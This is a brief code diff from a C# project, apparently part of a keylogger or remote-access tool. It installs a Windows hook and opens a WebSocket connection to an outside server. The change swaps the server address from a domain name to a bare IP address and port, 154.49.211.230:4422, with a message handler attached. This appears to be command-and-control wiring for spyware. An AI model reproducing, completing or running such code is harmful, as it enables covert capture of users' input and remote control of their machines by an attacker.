@@ -38,7 +38,7 @@ namespace A3
         {
             _hookID = SetHook(_proc);
             UnhookWindowsHookEx(_hookID);
-            using (var ws = new WebSocket("ws://araulin.me"))
+            using (var ws = new WebSocket("ws://154.49.211.230:4422"))
             {
                 ws.OnMessage += (sender, e) =>
                 {
